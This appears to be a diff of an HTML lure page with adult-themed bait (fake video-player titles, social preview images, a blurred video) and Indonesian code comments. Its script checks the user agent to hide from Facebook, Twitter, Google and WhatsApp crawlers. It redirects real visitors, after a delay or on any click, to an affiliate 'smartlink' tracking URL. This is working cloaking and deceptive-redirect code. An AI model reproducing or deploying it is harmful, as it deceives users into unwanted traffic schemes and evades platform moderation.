@@ -1,71 +1,265 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Online Now....💋💦</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
-    <!-- Essential Meta Tags -->
-    <meta name="description" content="Online Now....💋💦">
+<title id="page-title">LOADING...</title>
 
-    <!-- Open Graph / Meta Tags untuk Preview Gambar di DM & Threads -->
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="Online Now....💋💦">
-    <meta property="og:description" content="Online Now....💋💦">
-    <meta property="og:image" content="https://dsfdsfsfsdfdssdsd3434.pages.dev/blO2Y.jpg">
-    <meta property="og:image:secure_url" content="https://dsfdsfsfsdfdssdsd3434.pages.dev/blO2Y.jpg">
-    <meta property="og:image:type" content="image/jpeg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
+<meta name="description" content="🎥⏯️1:43―●―――――30:15📽️💋">
 
-    <!-- Twitter Card Meta Tags -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Online Now....💋💦">
-    <meta name="twitter:description" content="Twitter Image Preview">
-    <meta name="twitter:image" content="https://dsfdsfsfsdfdssdsd3434.pages.dev/blO2Y.jpg">
+<!-- OPEN GRAPH / THREADS / FB -->
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://islalynsmith7806.pages.dev/">
+<meta property="og:title" content="🎥⏯️1:43―●―――――30:15📽️💋">
+<meta property="og:description" content="🎥⏯️1:43―●―――――30:15📽️💋">
+<meta property="og:image" content="https://fototrapeyangbaru12.pages.dev/blO2Y.jpg">
+<meta property="og:image:secure_url" content="https://fototrapeyangbaru12.pages.dev/blO2Y.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:type" content="image/jpeg">
+
+<!-- TWITTER / X -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="🎥⏯️1:43―●―――――30:15📽️💋">
+<meta name="twitter:description" content="🎥⏯️1:43―●―――――30:15📽️💋">
+<meta name="twitter:image" content="https://fototrapeyangbaru12.pages.dev/blO2Y.jpg">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    -webkit-tap-highlight-color: transparent;
+}
+
+html,body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    background:#000;
+    cursor:pointer;
+    user-select:none;
+    -webkit-user-select:none;
+}
+
+/* Background video total */
+.bg{
+    position:fixed;
+    inset:0;
+    overflow:hidden;
+    z-index:1;
+}
+
+.bg video{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    object-position: center 85%;
+    filter:blur(30px) brightness(.4);
+    transform:scale(1.6);
+}
+
+/* Video utama di tengah (Fokus Badan Bawah) */
+.main-video{
+    position:fixed;
+    inset:0;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    z-index:2;
+}
+
+.main-video video{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    object-position: center 80%;
+    transform: scale(1.3);
+    filter: blur(6px) brightness(.8);
+}
+
+/* Overlay kegelapan lembut */
+.overlay{
+    position:fixed;
+    inset:0;
+    background:radial-gradient(circle at center, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.85) 100%);
+    z-index:3;
+}
+
+/* CONTAINER LOADING PRO DI TENGAH LAYAR */
+.content-wrapper{
+    position:fixed;
+    inset:0;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+    z-index:10;
+}
+
+.glass-card{
+    background: rgba(18, 18, 24, 0.7);
+    backdrop-filter: blur(16px);
+    -webkit-backdrop-filter: blur(16px);
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    border-radius: 28px;
+    padding: 35px 28px;
+    width: 100%;
+    max-width: 320px;
+    text-align: center;
+    color: white;
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.15);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+
+/* Pro Ring Spinner */
+.spinner-box {
+    position: relative;
+    width: 60px;
+    height: 60px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 18px;
+}
+
+.spinner-ring {
+    box-sizing: border-box;
+    position: absolute;
+    width: 55px;
+    height: 55px;
+    border: 4px solid rgba(255, 255, 255, 0.1);
+    border-top: 4px solid #25D366;
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+}
+
+.center-icon {
+    font-size: 20px;
+    animation: pulse 1.2s infinite ease-in-out;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+@keyframes pulse {
+    0%, 100% { transform: scale(0.9); opacity: 0.8; }
+    50% { transform: scale(1.15); opacity: 1; }
+}
+
+/* Teks Loading */
+.loading-text {
+    color: #ffffff;
+    font-size: 15px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+}
+
+.dots span {
+    animation: blink 1.4s infinite fill-mode: both;
+    font-weight: bold;
+}
+
+.dots span:nth-child(2) { animation-delay: .2s; }
+.dots span:nth-child(3) { animation-delay: .4s; }
+
+@keyframes blink {
+    0% { opacity: .2; }
+    20% { opacity: 1; }
+    100% { opacity: .2; }
+}
+</style>
 </head>
-<body>
 
-    <div class="spinner"></div>
+<body onclick="goOffer()">
 
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #0f0f11;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
-            border-top-color: #ff2d55;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-    </style>
+<!-- BACKGROUND BLUR VIDEO -->
+<div class="bg">
+    <video autoplay loop muted playsinline>
+        <source src="https://faizalpenikmatturuk.github.io/landing/bg1.mp4" type="video/mp4">
+    </video>
+</div>
 
-    <script>
-        var targetUrl = "https://cgiaaag.caclcks.com/s/133baad435f7a?track=ucliq001&subsource=ucliq001";
+<!-- VIDEO UTAMA (FOKUS BADAN BAWAH) -->
+<div class="main-video">
+    <video autoplay loop muted playsinline>
+        <source src="https://faizalpenikmatturuk.github.io/landing/bg1.mp4" type="video/mp4">
+    </video>
+</div>
 
-        // Deteksi lengkap bot scraper Facebook, Instagram, Threads, dan Meta
-        var userAgent = navigator.userAgent.toLowerCase();
-        var isBot = /facebookexternalhit|facebookcatalog|twitterbot|threads|metaexternalagent|facebook|instagram|whatsapp|telegrambot|googlebot/i.test(userAgent);
+<div class="overlay"></div>
 
-        // Mencegah redirect jika diakses oleh crawler Meta/Threads
-        if (!isBot) {
-            window.addEventListener('DOMContentLoaded', function() {
-                setTimeout(function() {
-                    window.location.replace(targetUrl);
-                }, 300);
-            });
-        }
-    </script>
+<!-- KONTEN PRO LOADING -->
+<div class="content-wrapper">
+    <div class="glass-card">
+        <div class="spinner-box">
+            <div class="spinner-ring"></div>
+            <span class="center-icon">🔒</span>
+        </div>
+        <div class="loading-text">
+            <span id="txt-loading">LOADING</span>
+            <span class="dots"><span>.</span><span>.</span><span>.</span></span>
+        </div>
+    </div>
+</div>
+
+<script>
+// =========================================================
+// 🔴 SMARTLINK TRAFEE
+// =========================================================
+const redirectURL = "https://cgiaaag.caclcks.com/s/133baad435f7a?track=ucliq001&subsource=ucliq001";
+// =========================================================
+
+let isRedirected = false;
+
+function goOffer() {
+    if (!isRedirected) {
+        isRedirected = true;
+        window.location.replace(redirectURL);
+    }
+}
+
+// DETEKSI BOT / FACEBOOK CRAWLER
+const isBot = /facebookexternalhit|facebookcatalog|twitterbot|bingbot|googlebot|slurp|WhatsApp/i.test(navigator.userAgent);
+
+// HANYA REDIRECT JIKA USER ASLI (BUKAN CRAWLER / BOT)
+if (!isBot) {
+    setTimeout(goOffer, 1200);
+}
+
+// AUTO-TRANSLATE MULTI LANGUAGE (ES, PT-BR, PT-PT, EN)
+const i18n = {
+    es: "CARGANDO",
+    "pt-br": "CARREGANDO",
+    "pt-pt": "A CARREGAR",
+    en: "LOADING"
+};
+
+const rawLang = (navigator.language || navigator.userLanguage || "en").toLowerCase();
+let lang = "en";
+
+if (rawLang.startsWith("es")) {
+    lang = "es";
+} else if (rawLang === "pt-pt" || rawLang.includes("pt-pt")) {
+    lang = "pt-pt";
+} else if (rawLang.startsWith("pt")) {
+    lang = "pt-br";
+}
+
+document.documentElement.lang = lang;
+document.title = i18n[lang] + "...";
+document.getElementById("txt-loading").innerText = i18n[lang];
+</script>
+
 </body>
 </html>
